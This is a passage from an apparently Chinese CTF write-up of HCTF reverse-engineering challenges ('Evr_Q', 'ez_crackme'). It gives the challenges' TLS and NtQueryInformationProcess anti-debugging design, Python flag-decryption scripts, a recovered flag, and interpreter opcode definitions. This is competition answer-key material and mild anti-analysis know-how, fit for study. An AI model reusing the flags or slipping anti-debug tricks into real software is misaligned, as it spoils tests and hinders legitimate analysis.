            <span class="token keyword">else</span><span class="token punctuation">:</span>
                print<span class="token punctuation">(</span><span class="token string">&apos;count:&apos;</span><span class="token punctuation">,</span> json_req\<span class="token punctuation">[</span><span class="token string">&apos;count&apos;</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

        observation <span class="token operator">=</span> observation_
        total_steps <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span></code></pre><p>Bin</p> <h3 id="evrq">Evr_Q</h3> <h4 id="0x00-&#x5199;&#x5728;&#x524D;&#x9762;">0x00 &#x5199;&#x5728;&#x524D;&#x9762;</h4> <p>&#x3000;&#x3000;&#x8FD9;&#x9898;&#x4E00;&#x5F00;&#x59CB;&#x662F;&#x51C6;&#x5907;TLS+SMC+&#x53CD;&#x8C03;&#x8BD5;&#x7684;&#xFF0C;&#x53D1;&#x73B0;&#x653E;&#x5728;&#x7B2C;&#x4E00;&#x9898;&#x6709;&#x4E9B;&#x4E0D;&#x592A;&#x5408;&#x9002;&#xFF0C;&#x5C31;&#x628A;SMC&#x7684;&#x8C03;&#x7528;&#x90E8;&#x5206;&#x5220;&#x6389;&#x4E86;&#x3002;<br>&#x3000;&#xFF08;&#x5176;&#x5B9E;&#x7559;&#x4E0B;&#x4E86;&#x5F69;&#x86CB;&#xFF0C;smc&#x7684;&#x5B9E;&#x73B0;&#x6211;&#x6CA1;&#x6709;&#x5220;XD&#xFF09;<br>&#x3000;<br>&#x3000;&#x3000;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#xFF1A;<br>&#x3000;&#x3000;&#x7528;TLS&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#x8FDB;&#x7A0B;&#x548C;&#x8C03;&#x8BD5;&#x5668;&#xFF0C;&#x8FDB;&#x5165;&#x4E3B;&#x51FD;&#x6570;&#x540E;&#x5148;&#x68C0;&#x6D4B;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x901A;&#x8FC7;&#x540E;&#x68C0;&#x6D4B;StartCode(&#x5373;flag)&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x5165;&apos;Y&apos;&#x786E;&#x8BA4;CM&#x3002;<br>&#x3000;&#x3000;<br>&#x3000;&#x3000;&#x90E8;&#x5206;&#x7EC6;&#x8282;&#xFF1A;</p> <blockquote> <ul> <li>Win10&#x7684;TLS&#x5728;vs17&#x4E0A;&#x6709;&#x70B9;&#x5C0F;Bug&#xFF0C;&#x53EA;&#x80FD;&#x5728;Debug&#x6A21;&#x5F0F;&#x4E0B;&#x8DD1;&#x8D77;&#x6765;&#xFF0C;&#x4E8E;&#x662F;&#x6CA1;&#x6709;&#x9009;&#x62E9;Release&#x7248;&#x672C;&#xFF0C;&#x5982;&#x679C;&#x7ED9;&#x5927;&#x5BB6;&#x5E26;&#x6765;&#x56F0;&#x6270;&#x8FD9;&#x91CC;&#x5341;&#x5206;&#x62B1;&#x6B49;&#x3002;</li> <li>&#x7528;&#x6237;&#x540D;&#x6CE8;&#x518C;&#x5B58;&#x5728;&#x591A;&#x89E3;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x6211;&#x628A;&#x8FDB;&#x4F4D;&#x503C;&#x820D;&#x53BB;&#x4E86;&#xFF08;&#x8F93;&#x5165;&apos;I&apos;&#x4E5F;&#x80FD;&#x901A;&#x8FC7;username&#x9A8C;&#x8BC1;&#x54E6;&#xFF09;</li> <li>StartCode&#x90E8;&#x5206;&#x5148;&#x9A8C;&#x8BC1;&#x957F;&#x5EA6;&#x4E3A;35<br>Step1: &#x5168;&#x4F53; xor 0x76<br>Step2: [7:14]&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x5148;&#x5F02;&#x6216;0xAD, &#x518D;&#x5C06;0b10101010&#x4F4D;&#x4E0E;0b01010101&#x4F4D;&#x4E92;&#x6362;<br>Step3: [14:21]&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x5148;&#x5F02;&#x6216;0xBE, &#x518D;&#x5C06;0b11001100&#x4F4D;&#x4E0E;0b00110011&#x4F4D;&#x4E92;&#x6362;<br>Step4: [21:28]&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x5148;&#x5F02;&#x6216;0xAD, &#x518D;&#x5C06;0b11110000&#x4F4D;&#x4E8E;0b00001111&#x4F4D;&#x4E92;&#x6362;</li> <li>Step2~4&#x52A0;&#x5BC6;&#x524D;&#x5148;&#x8C03;&#x7528;ntdll!NtQueryInformationProcess, &#x5404;&#x68C0;&#x67E5;1&#x79CD;&#x6807;&#x5FD7;(7, 30&#xFF0C;31)</li> <li>&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x505A;&#x6CD5;&#x76F4;&#x63A5;&#x7528;ida&#x770B;&#x4E86;&#xFF0C;cuz&#x6CA1;&#x6709;&#x9020;&#x6210;&#x4EFB;&#x4F55;&#x9759;&#x6001;&#x53CD;&#x7F16;&#x8BD1;&#x7684;&#x96BE;&#x5EA6;</li> </ul> </blockquote> <h4 id="0x01-wp">0x01 Wp</h4> <p> <a href="http://img.blog.csdn.net/20171114170235092"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://img.blog.csdn.net/20171114170235092"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <pre><code>    import random
    import os
    import hashlib

    enc_flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span>
    dec_flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> len<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span>

    <span class="token comment">#/////////////////////////////////////////////////</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">dec0_f</span></span><span class="token punctuation">(</span>dec_t<span class="token punctuation">,</span> enc_t<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
            dec_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x76</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> dec_t
    <span class="token comment">#/////////////////////////////////////////////////</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">dec1_f</span></span><span class="token punctuation">(</span>dec_t<span class="token punctuation">,</span> enc_t<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
            v1 <span class="token operator">=</span> <span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">1</span>
            v2 <span class="token operator">=</span> <span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span>
            enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v1 <span class="token operator">|</span> v2
            dec_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xAD</span>
        <span class="token keyword">return</span> dec_t
    <span class="token comment">#/////////////////////////////////////////////////</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">dec2_f</span></span><span class="token punctuation">(</span>dec_t<span class="token punctuation">,</span> enc_t<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
            v1 <span class="token operator">=</span> <span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x33</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">2</span>
            v2 <span class="token operator">=</span> <span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x33</span>
            enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v1 <span class="token operator">|</span> v2
            dec_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xBE</span>
        <span class="token keyword">return</span> dec_t
    <span class="token comment">#/////////////////////////////////////////////////</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">dec3_f</span></span><span class="token punctuation">(</span>dec_t<span class="token punctuation">,</span> enc_t<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
            v1 <span class="token operator">=</span> <span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">4</span>
            v2 <span class="token operator">=</span> <span class="token punctuation">(</span>enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span>
            enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v1 <span class="token operator">|</span> v2
            dec_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc_t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xEF</span>
        <span class="token keyword">return</span> dec_t
    <span class="token comment">#/////////////////////////////////////////////////</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">dec_f</span></span><span class="token punctuation">(</span>dec_flag<span class="token punctuation">,</span> enc_flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            dec_flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc_flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        dec_flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> dec3_f<span class="token punctuation">(</span>dec_flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span> enc_flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
        dec_flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> dec2_f<span class="token punctuation">(</span>dec_flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> enc_flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
        dec_flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> dec1_f<span class="token punctuation">(</span>dec_flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> enc_flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
        dec_flag <span class="token operator">=</span> dec0_f<span class="token punctuation">(</span>dec_flag<span class="token punctuation">,</span> dec_flag<span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span>
    <span class="token comment">#/////////////////////////////////////////////////</span>

    dec_f<span class="token punctuation">(</span>dec_flag<span class="token punctuation">,</span> enc_flag<span class="token punctuation">)</span>

    print <span class="token string">&apos;&apos;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>dec_flag<span class="token punctuation">)</span></code></pre><p>flag:</p> <pre><code>hctf<span class="token punctuation">{</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token constant">D55_CH0CK3R_B0o0M!</span><span class="token operator">-</span>xxxxxxxx<span class="token punctuation">}</span></code></pre><h3 id="ezcrackme">ez_crackme</h3> <p>&#x8003;&#x5BDF;&#x5BF9;&#x7B80;&#x5355;&#x89E3;&#x91CA;&#x5668;&#x7684;&#x9006;&#x5411;&#x80FD;&#x529B;&#x3002;</p> <h4 id="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;</h4> <pre><code>box<span class="token operator">=</span>\<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">32</span>
    box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p>&#x5148;&#x7528;&#x5982;&#x4E0A;&#x65B9;&#x5F0F;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;box&#x3002;</p> <p>&#x7528;&#x8FD9;&#x4E2A;box&#x5C06;&#x8F93;&#x5165;&#x7684;&#x660E;&#x6587;&#x8FDB;&#x884C;&#x4E71;&#x5E8F;&#x3002;</p> <pre><code>head <span class="token operator">=</span> <span class="token punctuation">(</span>out\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">5</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">5</span><span class="token punctuation">)</span>
    out\<span class="token punctuation">[</span><span class="token number">31</span>\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span><span class="token number">31</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> head</code></pre><p>&#x7136;&#x540E;&#x7528;&#x5982;&#x4E0A;&#x65B9;&#x5F0F;&#xFF0C;&#x5C06;&#x4E71;&#x5E8F;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6574;&#x4F53;&#x5FAA;&#x73AF;&#x5DE6;&#x79FB;3&#x4F4D;&#x3002;</p> <pre><code>key <span class="token operator">=</span> <span class="token string">&apos;deadbeef&apos;</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&apos;hex&apos;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>key\<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>&#x7136;&#x540E;&#x5229;&#x7528;key&#x548C;&#x4E0B;&#x6807;i&#x5BF9;&#x5DE6;&#x79FB;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x505A;&#x5F02;&#x6216;&#x5373;&#x53EF;&#x3002;</p> <p>&#x5B8C;&#x6574;python&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF1A;</p> <pre><code>key <span class="token operator">=</span> <span class="token string">&apos;deadbeef&apos;</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&apos;hex&apos;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">encrypt</span></span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    out<span class="token operator">=</span>\<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
    out2<span class="token operator">=</span>\<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
    x<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#gen box</span>
    box<span class="token operator">=</span>\<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">32</span>
        box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>flag\<span class="token punctuation">[</span>box\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    head <span class="token operator">=</span> <span class="token punctuation">(</span>out\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">5</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">5</span><span class="token punctuation">)</span>
    out\<span class="token punctuation">[</span><span class="token number">31</span>\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span><span class="token number">31</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> head
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>key\<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span>  out2

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">decrypt</span></span><span class="token punctuation">(</span>enc_list<span class="token punctuation">)</span><span class="token punctuation">:</span>
    out<span class="token operator">=</span>\<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
    out2<span class="token operator">=</span>\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span>
    x<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#gen box</span>
    box<span class="token operator">=</span>\<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">32</span>
        box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>enc_list\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>key\<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

    tail <span class="token operator">=</span> out\<span class="token punctuation">[</span><span class="token number">31</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x7</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> reversed<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">)</span>
    out\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>tail<span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out2\<span class="token punctuation">[</span>box\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span>\<span class="token punctuation">]</span> <span class="token operator">=</span> out\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span>
    <span class="token keyword">return</span>  <span class="token string">&apos;&apos;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>chr<span class="token punctuation">,</span>out2<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#### &#x89E3;&#x91CA;&#x5668;&#x5206;&#x6790;</span>

<span class="token operator">/</span><span class="token operator">/</span>register
<span class="token comment">#define _eax 0</span>
<span class="token comment">#define _ebx 1</span>
<span class="token comment">#define _ebx2 2</span>
<span class="token comment">#define _ecx 3</span>
<span class="token comment">#define _edx 4</span>
<span class="token comment">#define _esp 5</span>
<span class="token comment">#define _lf 6</span>
<span class="token comment">#define _neq 7</span>
<span class="token comment">#define \_t\_intp 8</span>
<span class="token comment">#define \_t\_chp 9</span>
<span class="token comment">#define \_t\_int 10</span>
<span class="token comment">#define _flag 11</span>
<span class="token comment">#define _enc 12</span>
<span class="token comment">#define _key 13</span>
<span class="token operator">/</span><span class="token operator">/</span>opcode
<span class="token comment">#define _mov (0&lt;&lt;1)</span>
<span class="token comment">#define _mov32 (1&lt;&lt;1)</span>
<span class="token comment">#define \_lea\_ch (2&lt;&lt;1)</span>
<span class="token comment">#define \_lea\_int (3&lt;&lt;1)</span>
<span class="token comment">#define \_ldr\_int (4&lt;&lt;1)</span>
<span class="token comment">#define \_ldr\_ch (5&lt;&lt;1)</span>
<span class="token comment">#define _add (6&lt;&lt;1)</span>
<span class="token comment">#define \_add\_pint (7&lt;&lt;1)</span>
<span class="token comment">#define \_add\_pch (8&lt;&lt;1)</span>
<span class="token comment">#define \_my\_xor (9&lt;&lt;1)</span>
<span class="token comment">#define _mod (10&lt;&lt;1)</span>
<span class="token comment">#define \_my\_or (11&lt;&lt;1)</span>
<span class="token comment">#define \_my\_and (12&lt;&lt;1)</span>
<span class="token comment">#define _push (13&lt;&lt;1)</span>
<span class="token comment">#define _pop (14&lt;&lt;1)</span>
<span class="token comment">#define _shr (15&lt;&lt;1)</span>
<span class="token comment">#define _shl (16&lt;&lt;1)</span>
<span class="token comment">#define _ror (17&lt;&lt;1)</span>
<span class="token comment">#define _cmpl (18&lt;&lt;1)</span>
